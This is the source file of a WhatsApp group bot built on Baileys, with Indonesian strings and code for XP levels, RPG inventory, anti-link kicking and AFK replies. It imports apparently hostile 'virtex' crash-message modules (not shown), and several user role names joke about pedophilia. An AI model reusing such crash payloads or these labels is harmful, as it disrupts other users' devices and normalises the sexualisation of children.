process.on('uncaughtException', console.error)
require("./config")
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, WAFlag } = require('@adiwajshing/baileys')
const zMiku = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
const path = require('path')
const os = require('os')
const { AnimeWallpaper } = require("anime-wallpaper")
 const { TiktokDownloader } = require('./lib/tiktokdl') 
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const hx = require("hxz-api")
const hxz = require('./lib/hxz-api')
const bdr = require('rumus-bdr')
const yogipw = require("tod-api")
const { color, bgcolor } = require('./lib/color')
const thiccysapi = require('textmaker-thiccy')
const toHur = require('@develoka/angka-terbilang-js')
const mathjs = require('mathjs')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { EmojiAPI } = require("emoji-api")
const imgbbUploader = require('imgbb-uploader')
const primbon = new Primbon()
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./lib/limit.js');
const emoji = new EmojiAPI()
const { smsg, formatp, times, tanggal, GIFBufferToVideoBuffer, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const { aiovideodl } = require('./lib/scraper.js')
const cheerio = require ("cheerio");
const textpro = require('./lib/textpro')
const { detikNews } = require('./lib/detik')
const { wikiSearch } = require('./lib/wiki.js');
const { Gempa } = require("./lib/gempa.js");
const ms = require('ms')
 let { covid } = require('./lib/covid.js') 
const { jadwaltv }= require('./lib/jadwaltv');
const { MikuTiktok } = require('./lib/tiktokmikudl');
const maker = require('mumaker')
const xfarrapi = require('xfarr-api')
const { hentai } = require('./lib/scraper2.js')
let { msgFilter } = require('./lib/antispam')
const { mediafireDl } = require('./lib/mediafire.js')

const _ = require('lodash')
const yargs = require('yargs/yargs')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}

const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')
const { 
  yta, 
  ytv, 
  searchResult 
 } = require('./lib/ytdl')
const { Darkjokes } = require("dhn-api")

let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));

 let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
 let _buruan = JSON.parse(fs.readFileSync('./storage/user/bounty.json'));
 let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/blood.json'))


global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
      new mongoDB(opts['db']) :
      new JSONFile(`src/database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
  if (global.db.data !== null) return
  global.db.READ = true
  await global.db.read()
  global.db.READ = false
  global.db.data = {
    users: {},
    chats: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
  }
  global.db.chain = _.chain(global.db.data)
}
loadDatabase()
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    ...(global.db || {})
}

let lolkey = global.lolhuman
let virtex1 = global.virtex1
let virtex2 = global.virtex2
let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []

let pendaftar = JSON.parse(fs.readFileSync('./storage/user/user.json'))
let balance = JSON.parse(fs.readFileSync('./database/balance.json'))
let ssewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
let ban = JSON.parse(fs.readFileSync('./database/ban.json'))
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/level.json'))
let limit = JSON.parse(fs.readFileSync('./database/limit.json'))
let setik = JSON.parse(fs.readFileSync('./src/sticker.json'))
let vien = JSON.parse(fs.readFileSync('./src/audio.json'))
let imagi = JSON.parse(fs.readFileSync('./src/image.json'))
let videox = JSON.parse(fs.readFileSync('./src/video.json'))
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
let _sewa = require("./lib/sewa");
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))


const time = moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')
const ucap = moment(Date.now()).tz('Asia/Kolkata').locale('id').format('a')
var buln = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
var myHari = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
var tgel = new Date();
var hri = tgel.getDate();
var bulnh = tgel.getMonth();
var thisHari = tgel.getDay(),
    thisDaye = myHari[thisHari];
var yye = tgel.getYear();
var syear = (yye < 1000) ? yye + 1900 : yye;
const jangwak = (hri + '' + buln[bulnh] + '' + syear)
const janghar = (thisDaye)

module.exports = Miku = async (Miku, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = global.prefa
const isCmd = body.startsWith(prefix)
const notCmd = body.startsWith('')
const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await Miku.decodeJid(Miku.user.id)
const isCreator = [botNumber, ...global.Owner, ...global.OwnerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = args.join(" ")
const from = m.chat
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const groupMetadata = m.isGroup ? await Miku.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = pendaftar.includes(m.sender)
const isBan = banUser.includes(m.sender)
const isBanChat = m.isGroup ? banchat.includes(from) : false
const isMod = [botNumber, ...global.Mod].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isRakyat = isCreator || global.rkyt.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const antiWame = m.isGroup ? ntwame.includes(from) : false
const antiVirtex = m.isGroup ? ntvirtex.includes(from) : true
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const isLeveling = m.isGroup ? _leveling.includes(from) : true
autoreadsw = true
const content = JSON.stringify(m.message)
const q = args.join(' ')

const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')

xeonbugpic = fs.readFileSync('./Rimed/xpic.jpeg')
const { xeonbut2 } = require('./Rimed/xeonbut2')
const { xeonvirtex } = require('./Rimed/rivirtex')
const { xeonbutton } = require('./Rimed/xeonbutton')
const { xeonbrutal } = require('./Rimed/virtex1')


const mongoose = require("mongoose");


const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = '*Selamat Malam*'
}
        if(time2 < "17:00:00"){
        var ucapanWaktu = '*Selamat Sore*'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = '*Selamat Siang*'
}
        if(time2 < "09:00:00"){
        var ucapanWaktu = '*Selamat Pagi*'
}


const reply = (teks) => {
           Miku.sendMessage(m.chat, { text: teks},{ quoted: m})
      }
        
        const replay = (teks) => {
            Miku.sendMessage(m.chat, { text: teks}, { quoted: m})
        }
        

function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
            }
            
		
if (m.message) {
addBalance(m.sender, randomNomor(574), balance)
console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }

        if (isCmd && !isUser){
			pendaftar.push(m.sender)
			fs.writeFileSync('./storage/user/user.json', JSON.stringify(pendaftar))
        } 

            const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
               }
            }

            const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
                }
            }

            const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
                }
             }

            const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
                }
            }

            const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
                }
            }

            const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }

            const getUserRank = (userId) => {
    let position = null
    let found = false
    _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
    Object.keys(_level).forEach((i) => {
        if (_level[i].id === userId) {
            position = i
            found = true
        }
    })
    if (found === false && position === null) {
        const obj = { id: userId, xp: 0, level: 1 }
        _level.push(obj)
        fs.writeFileSync('./database/level.json', JSON.stringify(_level))
        return 99
    } else {
        return position + 1
    }
}

const xpGain = new Set()

const isGained = (userId) => {
    return !!xpGain.has(userId)
}

const addCooldown = (userId) => {
    xpGain.add(userId)
    setTimeout(() => {
        return xpGain.delete(userId)
    }, 60000) 
}

var levelRole = getLevelingLevel(m.sender)
        var role = '👌👈Colikiawan👉👌'
        if (levelRole <= 2) {
            role = 'Pedopil'
        } else if (levelRole <= 3) {
            role = 'Babu'
        } else if (levelRole <= 4) {
            role = 'Copper II'
        } else if (levelRole <= 20) {
            role = 'Copper I'
        } else if (levelRole <= 25) {
            role = 'Silver V'
        } else if (levelRole <= 30) {
            role = 'Silver IV'
        } else if (levelRole <= 35) {
            role = 'Silver III'
        } else if (levelRole <= 40) {
            role = 'Silver II'
        } else if (levelRole <= 45) {
            role = 'Silver I'
        } else if (levelRole <= 50) {
            role = 'Gold V'
        } else if (levelRole <= 55) {
            role = 'Gold IV'
        } else if (levelRole <= 60) {
            role = 'Gold III'
        } else if (levelRole <= 65) {
            role = 'Gold II'
        } else if (levelRole <= 70) {
            role = 'Gold I'
        } else if (levelRole <= 75) {
            role = 'Platinum V'
        } else if (levelRole <= 80) {
            role = 'Platinum IV'
        } else if (levelRole <= 85) {
            role = 'Platinum III'
        } else if (levelRole <= 90) {
            role = 'Platinum II'
        } else if (levelRole <= 95) {
            role = 'Platinum I'
        } else if (levelRole < 100) {
            role = '😎 Kang Coli,Sange,Pendosa 😎'
        } else if (levelRole < 912) {
            role = '😎 Jester 😎'
        } else if (levelRole < 1001) {
            role = '*HeroSmile*'
        } else if (levelRole < 1501) {
            role = '💰 Soeltan 💰'
        } else if (levelRole < 2001) {
            role = '★ Loli Hunter ★'
        } 
	else if (levelRole < 7000) {
            role = '🤭 Pedofil,Sangean,Kang coli,Stress,Agak belok. 🤭'
        }
	else if (levelRole < 10000) {
            role = '★ Loli Hunter ★'
        }
        else if (levelRole < 1000000) {
            role = '💦Paha Namba Wan💦'
        } else if (levelRole < 99999999999999) {
            role = '*🌟 Shiodome Miuna 🌟*'
        }


        var levelRoles = getLevelingLevel(m.sender)
        var roles = 'Cop V'
        if (levelRoles <= 5) {
            roles = 'Cop IV'
        } else if (levelRoles <= 10) {
            roles = 'Cop III'
        } else if (levelRoles <= 15) {
            roles = 'Cop II'
        } else if (levelRoles <= 20) {
            roles = 'Cop I'
        } else if (levelRoles <= 25) {
            roles = 'Sil V'
        } else if (levelRoles <= 30) {
            roles = 'Sil IV'
        } else if (levelRoles <= 35) {
            roles = 'Sil III'
        } else if (levelRoles <= 40) {
            roles = 'Sil II'
        } else if (levelRoles <= 45) {
            roles = 'Sil I'
        } else if (levelRoles <= 50) {
            roles = 'Gol V'
        } else if (levelRoles <= 55) {
            roles = 'Gol IV'
        } else if (levelRoles <= 60) {
            roles = 'Gol III'
        } else if (levelRoles <= 65) {
            roles = 'Gol II'
        } else if (levelRoles <= 70) {
            roles = 'Gol I'
        } else if (levelRoles <= 75) {
            roles = 'Plat V'
        } else if (levelRoles <= 80) {
            roles = 'Plat IV'
        } else if (levelRoles <= 85) {
            roles = 'Plat III'
        } else if (levelRoles <= 90) {
            roles = 'Plat II'
        } else if (levelRoles <= 95) {
            roles = 'Plati I'
        } else if (levelRoles < 100) {
            roles = 'Exter'
        }
   
                        if (m.isGroup && isLeveling && isUser && Miku.public) {
                                const currentLevel = getLevelingLevel(m.sender)
                                const checkId = getLevelingId(m.sender)
                                try {
                                        addCooldown(m.sender)
                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
                                        const amountXp = Math.floor(Math.random() * 10) + 200
                                        const requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
                                        const getLevel = getLevelingLevel(m.sender)
                                        addLevelingXp(m.sender, amountXp)
                                        if (requiredXp <= getLevelingXp(m.sender)) {
                                        addLevelingLevel(m.sender, 1)
teks = `「 *User Level UP* 」\n\n@${m.sender.split("@")[0]} got leveled up!!\n\n*User XP*: ${getLevelingXp(m.sender)}\n*Level*: ${getLevel} -> ${getLevelingLevel(m.sender)}\n*Role*: ${role} \n\n`
Miku.sendMessage(m.chat, {text: teks, mentions:[m.sender]}, {quoted:m})
}

                        } catch (err) {
                                console.error("❌ An error occured !")
                        }
                }
                if (prefix && command) {
                                const currentLevel = getLevelingLevel(m.sender)
                                const checkId = getLevelingId(m.sender)
                                try {
                                        
                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
                                        const amountXp = Math.floor(Math.random() * 10) + 30
                                        const requiredXp = 30 * (Math.pow(2, currentLevel) - 1)
                                        const getLevel = getLevelingLevel(m.sender)
                                        addLevelingXp(m.sender, amountXp)
                                        if (requiredXp <= getLevelingXp(m.sender)) {
                                        addLevelingLevel(m.sender, 1)
                                        }
                                        
                        } catch (err) {
                                console.error("❌ An error occured !")
                        }
                }

if (autoreadsw) {
		if (from === 'status@broadcast') {
		Miku.chatRead(from)
	}
	}

if (global.autoreadpmngc) {
if (command) {
await Miku.sendPresenceUpdate('composing', m.chat)
Miku.sendReadReceipt(from, m.sender, [m.key.id])}
}
/*
  if (global.autoReadGc) {
  if (m.isGroup) { Miku.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
}
*/

  if (global.autoReadAll) { if (m.chat) { Miku.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
  }

    if (global.autoRecord) { if (m.chat) { Miku.sendPresenceUpdate('recording', m.chat) }
}

  if (global.autoTyping) { if (m.chat) { Miku.sendPresenceUpdate('composing', m.chat) }
}

  if (global.available) { if (m.chat) { Miku.sendPresenceUpdate('available', m.chat) }
  }

const hariRaya = new Date('6 1, 2022 00:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Day ${jjam}Hour ${mmmenit}Minute ${ddetik}Second`
			
async function hitungmundur(bulan, tanggal) { 
          let from = new Date(`${bulan} ${tanggal}, 2022 00:00:00`).getTime();
          let now = Date.now();
          let distance = from - now;
          let days = Math.floor(distance / (1000 * 60 * 60 * 24));
          let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
          let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
          let seconds = Math.floor((distance % (1000 * 60)) / 1000);
          return days + "Day " + hours + "Hour " + minutes + "Minute " + seconds + "Second"
        }
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isRakyat ? global.limitawal.rakyat : global.limitawal.free
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateDocument' in setting)) setting.templateDocument = true
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: false,
		templateGif: false,
		templateMsg: false,
		templateDocument: true,
	    }
} catch (err) {
console.error(err)
}

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
 "orderMessage": {
"orderId": orid, 
"thumbnail": img, 
"itemCount": itcount, 
"status": "INQUIRY", 
"surface": "CATALOG", 
"orderTitle": title, 
"message": text, 
"sellerJid": sellers, 
"token": tokens, 
"totalAmount1000": ammount, 
"totalCurrencyCode": "IDR", 
}
}), { userJid: jid })
Miku.relayMessage(jid, order.message, { messageId: order.key.id})
}


const { 
addInventoriDarah, 
cekDuluJoinAdaApaKagaDiJson, 
addDarah, 
kurangDarah, 
getDarah 
}  = require('./storage/user/blood.js')
const { 
cekInventoryAdaAtauGak, 
addInventori,  
addBesi, 
addEmas, 
addEmerald,
addUmpan,
addPotion,
kurangBesi, 
kurangEmas, 
kurangEmerald, 
kurangUmpan,
kurangPotion,
getBesi, 
getEmas, 
getEmerald,
getUmpan,
getPotion
} = require('./storage/user/exchange.js')
const { 
addInventoriMonay, 
cekDuluJoinAdaApaKagaMonaynyaDiJson, 
addMonay,
kurangMonay, 
getMonay 
} = require('./storage/user/money.js')
const { 
addInventoriLimit, 
cekDuluJoinAdaApaKagaLimitnyaDiJson, 
addLimit, 
kurangLimit, 
getLimit 
} = require('./storage/user/limit.js')
const { 
cekDuluHasilBuruanNya, 
addInventoriBuruan, 
addIkan,
addAyam, 
addKelinci, 
addDomba, 
addSapi,
addGajah,
kurangIkan,
kurangAyam, 
kurangKelinci, 
kurangDomba, 
kurangSapi,
kurangGajah,
getIkan,
getAyam, 
getKelinci, 
getDomba,
getSapi,
getGajah
} = require('./storage/user/prey.js')
let DarahAwal =  global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']   
   
 

        let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]

if (!isRakyat) {
rkyt.push(m.sender.split("@")[0])
}

global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/CheemsBot/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/CheemsBot${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`
Tolong jangan tag Beliau!
Beliau lagi AFK ${reason ? 'Dengan alasan ' + reason : 'no reason'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
Beliau telah online ${user.afkReason ? ' Setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
let ningen = ["Iya kak?","Ada apa ningen?","Ada apa kak?","Memanggil Saya?","Nani!?"]
let ning = pickRandom(ningen)
let jawaban =[
	"Apa Oniichan?",
	"Iya Kakanda?",
	"Ada apa Oniichan?",
	"Ada apa Kakanda?",
	"Huh? nani?..",
	"Iya?, Butuh sesuatu Oniichan?",
	"Watashi desuka?"
	]
let jawab = pickRandom(jawaban)
if (m.mtype === 'groupInviteMessage') {
teks = `Aku gabisa join groupnya kalo engga disuruh oleh pemilikku, Ketik *-owner* dan chat pemilikku jika ingin mengundang aku kedalam group.`
sendOrder(m.chat, teks, "5123658817728409", fs.readFileSync('./Assets/pic10.jpg'), `${BotName}`, "916909137213@s.whatsapp.net", "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==", "99999999999999999999")
}
if (budy.includes(`Kimi ga suki da miuna`)) {
if (!isCreator) return reply (`ah gomen, watashi sukina hitto ga iru 🙇`)
   reply (`Watashi mo Ri oniichan ga suki dayoo 👉👈`)
}
if (budy.includes(`I love you miuna`)) {
if (!isCreator) return reply (`Ah gomen\n aku lebih menyukai Ri oniichan >_<`)
   reply (`I love you to Ri oniichan`)
}
if (budy.includes(`miuna`)) {
if (!isCreator) return reply (ning)
   reply (jawab)
}

if (budy.includes(`Miuna`)) {
if (!isCreator) return reply (ning)
   reply (jawab)
}

if (AntiLink) {
    linkgce = await Miku.groupInviteCode(from)
    if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
    reply(`\`\`\`「  Antilink System  」\`\`\`\n\nNo action will be because you sent this group's link.`)
    } else if (isUrl(m.text)) {
    bvl = `\`\`\`「  *Antilink System*  」\`\`\`\n\nAdmin has sent a link so no action is taken.`
    if (isAdmins) return reply(bvl)
    if (m.key.fromMe) return reply(bvl)
    if (isCreator) return reply(bvl)
    kice = m.sender
    await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
    Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
    } else {
    }
    }
 
    if (antiWame)
    if (budy.includes(`wa.me`)) {
  if (!isBotAdmins) return
  bvl = `\`\`\`「 _'wa.me' PM link Detected!_  」\`\`\`\n\nLink sent by Admin so no action is taken!`
  if (isAdmins) return reply(bvl)
  if (m.key.fromMe) return reply(bvl)
  if (isCreator) return reply(bvl)
  kice = m.sender
  await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
  Miku.sendMessage(from, {text:`\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\n@${kice.split("@")[0]} Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
  } else {
  }
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\nLink sent by Admin so no action is taken!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
Miku.sendMessage(from, {text:`\`\`\`「 'wa.me' PM link Detected! 」\`\`\`\n\n@${kice.split("@")[0]}  Baka Has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

if (antiVirtex) {
    if (budy.length > 3500) {
    reply(`*Caution!*\n\n`.repeat(300))
    reply(`\`\`\`Virus Detected !!\`\`\`\n\nRevoving sender...`)
    if (!isBotAdmins) return reply(mess.botAdmin)
    Miku.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    }
    }


    if (AntiLink) {
        if (!isBotAdmins) return
        linkgce = await Miku.groupInviteCode(from)
        if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
        reply(`\`\`\`「  Antilink System  」\`\`\`\n\nNo action will be taken because you sent this group's link!`)
        } else if (isUrl(m.text)) {
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nAdmin has sent a group link so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        }

        
        if (AntiLinkYoutubeVid)
        if (budy.includes("https://youtu.be/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Yt video link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
        } else {
        }
        
        if (AntiLinkYoutubeChannel)
           if (budy.includes("https://youtube.com/")){
        if (!isBotAdmins) return
        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
        if (isAdmins) return reply(bvl)
        if (m.key.fromMe) return reply(bvl)
        if (isCreator) return reply(bvl)
        kice = m.sender
        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
